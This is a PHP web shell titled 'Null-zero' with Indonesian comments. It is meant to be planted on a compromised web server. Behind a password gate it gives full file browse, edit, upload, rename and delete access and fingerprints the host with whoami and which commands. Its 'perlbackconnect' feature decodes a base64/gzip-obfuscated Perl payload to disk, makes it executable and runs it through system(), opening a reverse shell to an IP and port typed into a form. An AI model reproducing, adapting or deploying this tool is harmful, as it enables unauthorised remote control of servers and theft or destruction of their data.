<?php
session_start();
date_default_timezone_set("Asia/Jakarta");

// Konfigurasi
$default_action = "FilesMan";
$default_use_ajax = true;
$default_charset = 'UTF-8';

// Fungsi untuk tampilan halaman login
function show_login_page($message = "")
{
?>
    <!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <style>
        body {
            font-family: monospace;
            display: flex;
            align-items: center;
            justify-content: center;
            height: 100vh;
            margin: 0;
            background-image: url('https://raw.githubusercontent.com/Cnull00/file_file/main/null.png'); /* Add the path to your background image */
            background-size: cover;
            background-position: center;
        }

        form {
            text-align: center;
        }

        input[type="password"] {
            border: none;
            border-bottom: 1px solid black;
            padding: 2px;
            background-color: transparent;
            outline: none;
        }

        input[type="password"]:focus {
            outline: none;
        }

        input[type="submit"] {
            border: none;
            padding: 4.5px 20px;
            background-color: transparent;
            color: transparent;
        }
    </style>
</head>

<body>
    <form action="" method="post">
        <div>
            <input type="password" name="pass" placeholder="&nbsp;Password">&nbsp;<input type="submit" name="submit" value=">">
        </div>
    </form>
</body>

</html>

<?php
    exit;
}

if (!isset($_SESSION['authenticated'])) {
    $stored_hashed_password = '$2a$10$9Xmvu1r9.nu4FjkWd.71AeX9Y3q.9yBxyNCS1BB5vdkN3t/EH5tqi'; 
    if (isset($_POST['pass']) && password_verify($_POST['pass'], $stored_hashed_password)) {
        $_SESSION['authenticated'] = true;
    } else {
        show_login_page();
    }
}
	
//fungsi logout
    function fungsi_logout() {
       session_unset(); // Menghapus semua variabel sesi
        session_destroy(); // Menghancurkan sesi
        header('Location: ' . $_SERVER['REQUEST_URI']); // Redirect ke halaman ini
        exit();
    }

    if ($_SERVER["REQUEST_METHOD"] == "GET" && isset($_GET["logout"])) {
        // Jika parameter GET "logout" ada, jalankan fungsi logout
        fungsi_logout();
    }

?>
<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Null-zero</title>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0-alpha1/dist/css/bootstrap.min.css" rel="stylesheet"
        integrity="sha384-GLhlTQ8iRABdZLl6O3oVMWSktQOp6b7In1Zl3/Jr59b6EGGoI1aFkw7cmDA6j6gD" crossorigin="anonymous">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.3.0/css/all.min.css"
        integrity="sha512-SzlrxWUlpfuzQ+pcUCosxcglQRNAq/DZjVsC0lE40xsADsfeQoEypE+enwcOiGjk/bSuGGKHEyjSoQ1zVisanQ=="
        crossorigin="anonymous" referrerpolicy="no-referrer" />
    <style>
        /* CSS untuk menyembunyikan elemen audio */
        audio {
            display: none;
        }
    </style>
</head>

<body class="bg-dark">

    <?php


    //function
    function formatSizeUnits($bytes)
    {
        if ($bytes >= 1073741824) {
            $bytes = number_format($bytes / 1073741824, 2) . ' GB';
        } elseif ($bytes >= 1048576) {
            $bytes = number_format($bytes / 1048576, 2) . ' MB';
        } elseif ($bytes >= 1024) {
            $bytes = number_format($bytes / 1024, 2) . ' KB';
        } elseif ($bytes > 1) {
            $bytes = $bytes . ' bytes';
        } elseif ($bytes == 1) {
            $bytes = $bytes . ' byte';
        } else {
            $bytes = '0 bytes';
        }
        return $bytes;
    }

    function fileExtension($file)
    {
        return substr(strrchr($file, '.'), 1);
    }

    function fileIcon($file)
    {
        $imgs = array("apng", "avif", "gif", "jpg", "jpeg", "jfif", "pjpeg", "pjp", "png", "svg", "webp");
        $audio = array("wav", "m4a", "m4b", "mp3", "ogg", "webm", "mpc");
        $ext = strtolower(fileExtension($file));
        if ($file == "error_log") {
            return '<i class="fa-sharp fa-solid fa-bug"></i> ';
        } elseif ($file == ".htaccess") {
            return '<i class="fa-solid fa-hammer"></i> ';
        }
        if ($ext == "html" || $ext == "htm") {
            return '<i class="fa-brands fa-html5"></i> ';
        } elseif ($ext == "php" || $ext == "phtml") {
            return '<i class="fa-brands fa-php"></i> ';
        } elseif (in_array($ext, $imgs)) {
            return '<i class="fa-regular fa-images"></i> ';
        } elseif ($ext == "css") {
            return '<i class="fa-brands fa-css3"></i> ';
        } elseif ($ext == "txt") {
            return '<i class="fa-regular fa-file-lines"></i> ';
        } elseif (in_array($ext, $audio)) {
            return '<i class="fa-duotone fa-file-music"></i> ';
        } elseif ($ext == "py") {
            return '<i class="fa-brands fa-python"></i> ';
        } elseif ($ext == "js") {
            return '<i class="fa-brands fa-js"></i> ';
        } else {
            return '<i class="fa-solid fa-file"></i> ';
        }
    }

    function encodePath($path)
    {
        $a = array("/", "\\", ".", ":");
        $b = array("ক", "খ", "গ", "ঘ");
        return str_replace($a, $b, $path);
    }
    function decodePath($path)
    {
        $a = array("/", "\\", ".", ":");
        $b = array("ক", "খ", "গ", "ঘ");
        return str_replace($b, $a, $path);
    }



    $root_path = __DIR__;
    if (isset($_GET['p'])) {
        if (empty($_GET['p'])) {
            $p = $root_path;
        } elseif (!is_dir(decodePath($_GET['p']))) {
            echo ("<script>\nalert('Directory is Corrupted and Unreadable.');\nwindow.location.replace('?');\n</script>");
        } elseif (is_dir(decodePath($_GET['p']))) {
            $p = decodePath($_GET['p']);
        }
    } elseif (isset($_GET['q'])) {
        if (!is_dir(decodePath($_GET['q']))) {
            echo ("<script>window.location.replace('?p=');</script>");
        } elseif (is_dir(decodePath($_GET['q']))) {
            $p = decodePath($_GET['q']);
        }
    } else {
        $p = $root_path;
    }
    define("PATH", $p);

    echo ('
<nav class="navbar navbar-light" style="background-color: #e3f2fd;">
  <div class="navbar-brand">
  <a href="?"><img src="https://raw.githubusercontent.com/Cnull00/file_file/main/null.ico" width="30" height="30" alt=""></a>
');

    $path = str_replace('\\', '/', PATH);
    $paths = explode('/', $path);
    foreach ($paths as $id => $dir_part) {
        if ($dir_part == '' && $id == 0) {
            $a = true;
            echo "<a href=\"?p=/\">/</a>";
            continue;
        }
        if ($dir_part == '')
            continue;
        echo "<a href='?p=";
        for ($i = 0; $i <= $id; $i++) {
            echo str_replace(":", "ঘ", $paths[$i]);
            if ($i != $id)
                echo "ক";
        }
        echo "'>" . $dir_part . "</a>/";
    }
    echo ('
</div>
<div class="form-inline">
<a href="?info&q=' . urlencode(encodePath(PATH)) . '"><button class="btn btn-dark" type="button">Tools</button></a>
<a href="?"><button type="button" class="btn btn-dark">HOME</button></a> 
<a href="?logout"><button type="button" class="btn btn-danger">logout</button></a> <!-- funsi logout -->
</div>
</nav>');


    if (isset($_GET['p'])) {

        //fetch files
        if (is_readable(PATH)) {
            $fetch_obj = scandir(PATH);
            $folders = array();
            $files = array();
            foreach ($fetch_obj as $obj) {
                if ($obj == '.' || $obj == '..') {
                    continue;
                }
                $new_obj = PATH . '/' . $obj;
                if (is_dir($new_obj)) {
                    array_push($folders, $obj);
                } elseif (is_file($new_obj)) {
                    array_push($files, $obj);
                }
            }
        }
        echo '
<table class="table table-active text-light">
  <thead>
    <tr>
      <th scope="col">Name</th>
      <th scope="col">Size</th>
      <th scope="col">Modified</th>
      <th scope="col">Perms</th>
      <th scope="col">Actions</th>
    </tr>
  </thead>
  <tbody>
';
        foreach ($folders as $folder) {
            echo "    <tr>
      <td><i class='fa-solid fa-folder'></i> <a href='?p=" . urlencode(encodePath(PATH . "/" . $folder)) . "'>" . $folder . "</a></td>
      <td><b>---</b></td>
      <td>". date("F d Y H:i:s.", filemtime(PATH . "/" . $folder)) . "</td>
      <td>0" . substr(decoct(fileperms(PATH . "/" . $folder)), -3) . "</a></td>
      <td>
      <a title='Rename' href='?q=" . urlencode(encodePath(PATH)) . "&r=" . $folder . "'><i class='fa-sharp fa-regular fa-pen-to-square'></i></a>
      <a title='Delete' href='?q=" . urlencode(encodePath(PATH)) . "&d=" . $folder . "'><i class='fa fa-trash' aria-hidden='true'></i></a>
      <td>
    </tr>
";
        }
        foreach ($files as $file) {
            echo "    <tr>
          <td>" . fileIcon($file) . $file . "</td>
          <td>" . formatSizeUnits(filesize(PATH . "/" . $file)) . "</td>
          <td>" . date("F d Y H:i:s.", filemtime(PATH . "/" . $file)) . "</td>
          <td>0". substr(decoct(fileperms(PATH . "/" .$file)), -3) . "</a></td>
          <td>
          <a title='Edit File' href='?q=" . urlencode(encodePath(PATH)) . "&e=" . $file . "'><i class='fa-solid fa-file-pen'></i></a>
          <a title='Rename' href='?q=" . urlencode(encodePath(PATH)) . "&r=" . $file . "'><i class='fa-sharp fa-regular fa-pen-to-square'></i></a>
          <a title='Delete' href='?q=" . urlencode(encodePath(PATH)) . "&d=" . $file . "'><i class='fa fa-trash' aria-hidden='true'></i></a>
          <td>
    </tr>
";		
        }
        echo "  </tbody>
</table>"
		;
    } else {
        if (empty($_GET)) {
            echo ("<script>window.location.replace('?p=');</script>");
        }
    }
    if (isset($_GET['upload'])) {
        echo '
        <form method="post" enctype="multipart/form-data" style="color: white;">
            Pilih file:
            <input type="file" name="fileToUpload" id="fileToUpload">
            <input type="submit" class="btn btn-primary" value="Upload" name="upload">
        </form>';
    }
    if (isset($_GET['info'])) {
    // Mendapatkan informasi kernel menggunakan php_uname
    $kernel_info = php_uname('s') . ' ' . php_uname('r');
    $serverUsername = trim(exec('whoami'));
    echo "<h4 class='text-light'>User:$serverUsername</h4>";
    // Mendapatkan informasi versi Apache menggunakan apache_get_version
    $apache_version = apache_get_version();

    // Menampilkan informasi kernel dan versi Apache
    echo "<h4 class='text-light'>$kernel_info</h4>";
    echo "<h4 class='text-light'>$apache_version</h4>";
    echo "<h4 class='text-light'>IP:{$_SERVER['REMOTE_ADDR']}</h4>";
    $total_space = disk_total_space('/');

// Mendapatkan space yang tersedia (dalam bytes)
$available_space = disk_free_space('/');

// Mengkonversi ke dalam format yang lebih mudah dibaca
$total_space_gb = round($total_space / (1024 * 1024 * 1024), 2); // Konversi ke GB
$available_space_gb = round($available_space / (1024 * 1024 * 1024), 2); // Konversi ke GB

// Cek ketersediaan Perl
$perlAvailability = shell_exec('which perl');
$perlStatus = (isset($perlAvailability) && !empty($perlAvailability)) ? 'ON' : 'OFF';

// Cek ketersediaan Python
$pythonAvailability = shell_exec('which python');
$pythonStatus = (isset($pythonAvailability) && !empty($pythonAvailability)) ? 'ON' : 'OFF';

// Cek ketersediaan GCC
$gccAvailability = shell_exec('which gcc');
$gccStatus = (isset($gccAvailability) && !empty($gccAvailability)) ? 'ON' : 'OFF';

// Informasi sistem menggunakan PHP's php_uname() function
$systemInfo = php_uname();

// Menampilkan informasi
echo "<h4 class='text-light'>Total Disk Space: {$total_space_gb} GB</h4>";
echo "<h4 class='text-light'>Available Disk Space: {$available_space_gb} GB</h4>";
echo "<h4 class='text-light'>GCC: {$gccStatus}</h4>";
echo "<h4 class='text-light'>System Info:{$systemInfo}</h4>";
echo "<h4 class='text-light'>Perl Status:{$perlStatus}</h4>";
echo "<h4 class='text-light'>Python Status:{$pythonStatus}</h4>";
echo "<hr>";
echo ('<div class="container">
<div class="row">
  <div class="col">
  <a href="?pbc&q=' . urlencode(encodePath(PATH)) . '"><button type="button" class="btn btn-primary">perlbackconnect</button></a>
  </div>
  <div class="col">
  <a href="?upload&q=' . urlencode(encodePath(PATH)) . '"><button type="button" class="btn btn-primary">Upload file</button></a>
  </div>
  <div class="col">
  <a href="?logout=1"><button type="button" class="btn btn-primary">logout</button></a>
  </div>
</div>
</div>');
}

if(isset($_GET['pbc'])) {
    echo '<font size="2" face="comic sans ms" color="white">';
    echo '<p><form method="POST" action="" style="color: white;">';
    echo 'Client ip:<input type="text" name="ip" value=' . $_SERVER['REMOTE_ADDR'] . ' style="color: black;">';
    echo 'Connection Port:<input type="text" name="port" style="color: black;"><p>';
    echo '<input type="submit" name="sbm" value=">>" style="color: black;" /></form>';
}

if(isset($_POST['sbm'])) {
    $r = $_POST["ip"];
    $s = $_POST["port"];
    $p1 = 'hVNhb5swEP0eKf/hSqsGJFig/TApEdWylKxZt1ABiSYhFBlyTVBcO8JmazTtvw8MVKnWqSDh83tnv2ffcX42LEUxTHM2PGBB+71+rxQIc380Cnm2RzmuoQtxFBKfwIWBSk2J2A0aZhJ8mbqfqu9KzQ9FziRoYFmuG8efSbafcsYwkxDukNIkcV3LAtbyKX8G/ovhBtIjLEpKs2OKRZfEADS1af4IuhI6c68M+F1D0AotBdniCC5siO+4kAnED7yoBsaapbDJETTvWaU4Vx8/2NXrgHPtXEOb8qc79MmB6+ksp3hH2IaigoRi9dCf3nuRCQ+z9XxRBzWwDqPAm3w3YYvyUHDJ0yMjT6gPZHYYGAbwQvloPcdWAktGUoogOQQoOP2JUNtvHWXNlb1o1dJksynWOVP3sIqdxIScoVwTyTvMTox3pLpSnEg1ha2jRsy6IaXkj7QUO91QGfyATA+j2/nCBO3msknTXnP+MjL/x3lB8A/X2asq/NbzTvOcOte1kgmsjjQPo9n8mzeGZh5OVl6NwRizHa/AqhxgERi/hIpQO7WmWk+teNWZfteZ07o1bRtOGvMtw18J2xIGKWFHsq+GjEvYcyY5hR+3J4tf+W9/rcbCuefP+r2/';
    
    $dec = gzinflate(base64_decode($p1));
    $fname = fopen('backconn.pl','w');
    fwrite($fname, $dec); 
    fclose($fname);
    
    $d = "backconn.pl";
    $ch = "chmod +x " . $d;
    $permission = system($ch);
    
    $z = "perl " . $d . " " . $r . " " . $s;
    $run = system($z);
}  
    if (isset($_GET['r'])) {
        if (!empty($_GET['r']) && isset($_GET['q'])) {
            echo '
    <form method="post">
        Rename:
        <input type="text" name="name" value="' . $_GET['r'] . '">
        <input type="submit" class="btn btn-dark" value="Rename" name="rename">
    </form>';
            if (isset($_POST['rename'])) {
                $name = PATH . "/" . $_GET['r'];
                if(rename($name, PATH . "/" . $_POST['name'])) {
                    echo ("<script>alert('Renamed.'); window.location.replace('?p=" . encodePath(PATH) . "');</script>");
                } else {
                    echo ("<script>alert('Some error occurred.'); window.location.replace('?p=" . encodePath(PATH) . "');</script>");
                }
            }
        }
    }

    if (isset($_GET['e'])) {
        if (!empty($_GET['e']) && isset($_GET['q'])) {
            echo '
    <form method="post">
        <textarea style="height: 500px;
        width: 90%;" name="data">' . htmlspecialchars(file_get_contents(PATH."/".$_GET['e'])) . '</textarea>
        <br>
        <input type="submit" class="btn btn-dark" value="Save" name="edit">
    </form>';

    if(isset($_POST['edit'])) {
        $filename = PATH."/".$_GET['e'];
        $data = $_POST['data'];
        $open = fopen($filename,"w");
        if(fwrite($open,$data)) {
            echo ("<script>alert('Saved.'); window.location.replace('?p=" . encodePath(PATH) . "');</script>");
        } else {
            echo ("<script>alert('Some error occurred.'); window.location.replace('?p=" . encodePath(PATH) . "');</script>");
        }
        fclose($open);
    }
        }
    }

    if (isset($_POST["upload"])) {
        $target_file = PATH . "/" . $_FILES["fileToUpload"]["name"];
        if (move_uploaded_file($_FILES["fileToUpload"]["tmp_name"], $target_file)) {
            echo "<p>".htmlspecialchars(basename($_FILES["fileToUpload"]["name"])) . " has been uploaded.</p>";
        } else {
            echo "<p>Sorry, there was an error uploading your file.</p>";
        }

    }
    if (isset($_GET['d']) && isset($_GET['q'])) {
        $name = PATH . "/" . $_GET['d'];
        if (is_file($name)) {
            if(unlink($name)) {
                echo ("<script>alert('File removed.'); window.location.replace('?p=" . encodePath(PATH) . "');</script>");
            } else {
                echo ("<script>alert('Some error occurred.'); window.location.replace('?p=" . encodePath(PATH) . "');</script>");
            }
        } elseif (is_dir($name)) {
            if(rmdir($name) == true) {
                echo ("<script>alert('Directory removed.'); window.location.replace('?p=" . encodePath(PATH) . "');</script>");
            } else {
                echo ("<script>alert('Some error occurred.'); window.location.replace('?p=" . encodePath(PATH) . "');</script>");
            }
        }
    }
        
    ?>
  <audio controls autoplay>
        <source src="https://github.com/Cnull00/file_file/raw/main/Tolol.mp3" type="audio/mp3">
    </audio>
    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0-alpha1/dist/js/bootstrap.bundle.min.js"
        integrity="sha384-w76AqPfDkMBDXo30jS1Sgez6pr3x5MlQ1ZAGC+nuZB+EYdgRZgiwxhTBTkF7CXvN"
        crossorigin="anonymous"></script>
</body>

</html>
